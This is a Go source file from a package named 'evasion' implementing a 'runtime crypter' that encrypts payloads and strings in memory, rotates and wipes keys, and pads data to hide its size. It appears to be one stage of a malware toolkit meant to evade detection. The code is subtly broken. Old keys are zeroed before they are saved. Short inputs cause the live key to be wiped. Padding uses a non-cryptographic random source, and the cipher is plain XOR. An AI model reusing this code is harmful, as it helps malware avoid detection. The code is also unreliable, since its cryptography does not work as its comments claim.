package evasion

/*
	Stage 2.1: Runtime Crypter Implementation
	Provides encryption/decryption capabilities for runtime payload protection
*/

import (
	"crypto/rand"
	"crypto/sha256"
	insecureRand "math/rand"
	"runtime"
	"time"
)

// CrypterConfig holds configuration for runtime encryption
type CrypterConfig struct {
	KeyRotationInterval time.Duration
	ChunkSize           int
	UseRandomPadding    bool
	ClearKeyAfterUse    bool
}

// RuntimeCrypter provides encryption services for payloads in memory
type RuntimeCrypter struct {
	config       CrypterConfig
	currentKey   []byte
	keyHistory   [][]byte
	lastRotation time.Time
}

// NewRuntimeCrypter creates a new crypter with default configuration
func NewRuntimeCrypter() *RuntimeCrypter {
	config := CrypterConfig{
		KeyRotationInterval: time.Minute * time.Duration(insecureRand.Intn(10)+5), // 5-15 minutes
		ChunkSize:           256,
		UseRandomPadding:    true,
		ClearKeyAfterUse:    true,
	}

	crypter := &RuntimeCrypter{
		config:       config,
		keyHistory:   make([][]byte, 0, 10),
		lastRotation: time.Now(),
	}

	crypter.rotateKey()
	return crypter
}

// rotateKey generates a new encryption key and clears old ones
func (rc *RuntimeCrypter) rotateKey() {
	// Generate new 32-byte key
	newKey := make([]byte, 32)
	rand.Read(newKey)

	// Clear old key from memory if configured
	if rc.config.ClearKeyAfterUse && rc.currentKey != nil {
		rc.clearMemory(rc.currentKey)
		rc.keyHistory = append(rc.keyHistory, rc.currentKey)

		// Keep only last 3 keys for potential decryption needs
		if len(rc.keyHistory) > 3 {
			rc.clearMemory(rc.keyHistory[0])
			rc.keyHistory = rc.keyHistory[1:]
		}
	}

	rc.currentKey = newKey
	rc.lastRotation = time.Now()

	// Trigger garbage collection to clear any residual key material
	runtime.GC()
}

// EncryptPayload encrypts a payload with current key and random padding
func (rc *RuntimeCrypter) EncryptPayload(data []byte) ([]byte, error) {
	// Check if key rotation is needed
	if time.Since(rc.lastRotation) > rc.config.KeyRotationInterval {
		rc.rotateKey()
	}

	// Add random padding if configured
	paddedData := data
	if rc.config.UseRandomPadding {
		paddedData = rc.addRandomPadding(data)
	}

	// Encrypt using XOR with key derivation
	encrypted := rc.xorEncrypt(paddedData, rc.currentKey)

	// Add entropy header with timing information
	header := rc.generateHeader()
	result := append(header, encrypted...)

	return result, nil
}

// DecryptPayload decrypts a payload, trying current and historical keys
func (rc *RuntimeCrypter) DecryptPayload(encryptedData []byte) ([]byte, error) {
	if len(encryptedData) < 16 {
		return nil, ErrInvalidPayload
	}

	// Extract header and encrypted content
	header := encryptedData[:16]
	encrypted := encryptedData[16:]

	// Verify header integrity
	if !rc.verifyHeader(header) {
		return nil, ErrInvalidHeader
	}

	// Try current key first
	if decrypted := rc.tryDecrypt(encrypted, rc.currentKey); decrypted != nil {
		return rc.removeRandomPadding(decrypted), nil
	}

	// Try historical keys
	for i := len(rc.keyHistory) - 1; i >= 0; i-- {
		if decrypted := rc.tryDecrypt(encrypted, rc.keyHistory[i]); decrypted != nil {
			return rc.removeRandomPadding(decrypted), nil
		}
	}

	return nil, ErrDecryptionFailed
}

// xorEncrypt performs XOR encryption with key stretching
func (rc *RuntimeCrypter) xorEncrypt(data, key []byte) []byte {
	result := make([]byte, len(data))

	// Create extended key using SHA256 chaining
	extendedKey := rc.stretchKey(key, len(data))

	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ extendedKey[i]
	}

	// Clear extended key from memory
	rc.clearMemory(extendedKey)

	return result
}

// stretchKey extends the key to match data length using SHA256
func (rc *RuntimeCrypter) stretchKey(key []byte, targetLength int) []byte {
	if targetLength <= len(key) {
		return key[:targetLength]
	}

	result := make([]byte, targetLength)
	copy(result, key)

	pos := len(key)
	currentHash := key

	for pos < targetLength {
		// Generate next block using SHA256
		h := sha256.Sum256(currentHash)
		currentHash = h[:]

		// Copy as much as needed
		copyLen := len(currentHash)
		if pos+copyLen > targetLength {
			copyLen = targetLength - pos
		}

		copy(result[pos:pos+copyLen], currentHash[:copyLen])
		pos += copyLen
	}

	return result
}

// tryDecrypt attempts to decrypt with a specific key
func (rc *RuntimeCrypter) tryDecrypt(encrypted, key []byte) []byte {
	decrypted := rc.xorEncrypt(encrypted, key) // XOR is symmetric

	// Basic integrity check - look for reasonable data patterns
	if rc.validateDecrypted(decrypted) {
		return decrypted
	}

	return nil
}

// validateDecrypted performs basic validation on decrypted data
func (rc *RuntimeCrypter) validateDecrypted(data []byte) bool {
	if len(data) == 0 {
		return false
	}

	// Check for reasonable entropy (not all zeros or all same byte)
	first := data[0]
	allSame := true
	for _, b := range data {
		if b != first {
			allSame = false
			break
		}
	}

	return !allSame
}

// addRandomPadding adds random bytes to obscure payload size
func (rc *RuntimeCrypter) addRandomPadding(data []byte) []byte {
	paddingSize := insecureRand.Intn(32) + 8 // 8-40 bytes of padding

	// Add padding size as first byte, then random padding, then data
	result := make([]byte, 1+paddingSize+len(data))
	result[0] = byte(paddingSize)

	// Fill padding with random data
	for i := 1; i <= paddingSize; i++ {
		result[i] = byte(insecureRand.Intn(256))
	}

	// Copy original data
	copy(result[1+paddingSize:], data)

	return result
}

// removeRandomPadding strips padding from decrypted data
func (rc *RuntimeCrypter) removeRandomPadding(data []byte) []byte {
	if len(data) == 0 {
		return data
	}

	paddingSize := int(data[0])
	if paddingSize+1 >= len(data) {
		return data // Invalid padding, return as-is
	}

	return data[1+paddingSize:]
}

// generateHeader creates an entropy header for encrypted payloads
func (rc *RuntimeCrypter) generateHeader() []byte {
	header := make([]byte, 16)

	// Fill with pseudo-random data based on current time
	timestamp := time.Now().UnixNano()
	for i := 0; i < 8; i++ {
		header[i] = byte(timestamp >> (i * 8))
	}

	// Add random padding for remaining bytes
	for i := 8; i < 16; i++ {
		header[i] = byte(insecureRand.Intn(256))
	}

	return header
}

// verifyHeader checks header integrity
func (rc *RuntimeCrypter) verifyHeader(header []byte) bool {
	if len(header) != 16 {
		return false
	}

	// Extract timestamp
	timestamp := int64(0)
	for i := 0; i < 8; i++ {
		timestamp |= int64(header[i]) << (i * 8)
	}

	// Verify timestamp is reasonable (within last 24 hours)
	now := time.Now().UnixNano()
	if timestamp > now || timestamp < now-24*time.Hour.Nanoseconds() {
		return false
	}

	return true
}

// clearMemory securely clears sensitive data from memory
func (rc *RuntimeCrypter) clearMemory(data []byte) {
	if len(data) == 0 {
		return
	}

	// Overwrite with random data first
	for i := range data {
		data[i] = byte(insecureRand.Intn(256))
	}

	// Then overwrite with zeros
	for i := range data {
		data[i] = 0
	}

	// Force memory barrier to prevent optimization
	runtime.KeepAlive(data)
}

// ClearAll securely clears all crypter state
func (rc *RuntimeCrypter) ClearAll() {
	if rc.currentKey != nil {
		rc.clearMemory(rc.currentKey)
		rc.currentKey = nil
	}

	for _, key := range rc.keyHistory {
		rc.clearMemory(key)
	}
	rc.keyHistory = nil

	runtime.GC()
}

// Stage 2.1: Enhanced payload encryption for specific data types
// EncryptString encrypts a string and returns base64-like encoded result
func (rc *RuntimeCrypter) EncryptString(s string) string {
	if s == "" {
		return ""
	}

	data := []byte(s)
	encrypted, _ := rc.EncryptPayload(data)

	// Encode as hex string to avoid null bytes in strings
	return rc.bytesToHexString(encrypted)
}

// DecryptString decrypts a hex-encoded encrypted string
func (rc *RuntimeCrypter) DecryptString(hexString string) string {
	if hexString == "" {
		return ""
	}

	encrypted := rc.hexStringToBytes(hexString)
	if encrypted == nil {
		return ""
	}

	decrypted, err := rc.DecryptPayload(encrypted)
	if err != nil {
		return ""
	}

	return string(decrypted)
}

// bytesToHexString converts bytes to hex string representation
func (rc *RuntimeCrypter) bytesToHexString(data []byte) string {
	const hexChars = "0123456789abcdef"
	result := make([]byte, len(data)*2)

	for i, b := range data {
		result[i*2] = hexChars[b>>4]
		result[i*2+1] = hexChars[b&0x0f]
	}

	return string(result)
}

// hexStringToBytes converts hex string back to bytes
func (rc *RuntimeCrypter) hexStringToBytes(hexString string) []byte {
	if len(hexString)%2 != 0 {
		return nil
	}

	result := make([]byte, len(hexString)/2)
	for i := 0; i < len(result); i++ {
		high := rc.hexCharToByte(hexString[i*2])
		low := rc.hexCharToByte(hexString[i*2+1])
		if high == 255 || low == 255 {
			return nil
		}
		result[i] = high<<4 | low
	}

	return result
}

// hexCharToByte converts a hex character to byte value
func (rc *RuntimeCrypter) hexCharToByte(c byte) byte {
	switch {
	case c >= '0' && c <= '9':
		return c - '0'
	case c >= 'a' && c <= 'f':
		return c - 'a' + 10
	case c >= 'A' && c <= 'F':
		return c - 'A' + 10
	default:
		return 255 // Invalid
	}
}

// Custom errors for crypter operations
var (
	ErrInvalidPayload   = &CrypterError{"invalid payload format"}
	ErrInvalidHeader    = &CrypterError{"invalid header"}
	ErrDecryptionFailed = &CrypterError{"decryption failed"}
)

type CrypterError struct {
	msg string
}

func (e *CrypterError) Error() string {
	return e.msg
}

// Global crypter instance for easy access
var globalCrypter *RuntimeCrypter

// InitializeRuntimeCrypter initializes the global crypter
func InitializeRuntimeCrypter() {
	globalCrypter = NewRuntimeCrypter()
}

// GetGlobalCrypter returns the global crypter instance
func GetGlobalCrypter() *RuntimeCrypter {
	if globalCrypter == nil {
		InitializeRuntimeCrypter()
	}
	return globalCrypter
}

// EncryptGlobal encrypts using the global crypter
func EncryptGlobal(data []byte) ([]byte, error) {
	return GetGlobalCrypter().EncryptPayload(data)
}

// DecryptGlobal decrypts using the global crypter
func DecryptGlobal(data []byte) ([]byte, error) {
	return GetGlobalCrypter().DecryptPayload(data)
}
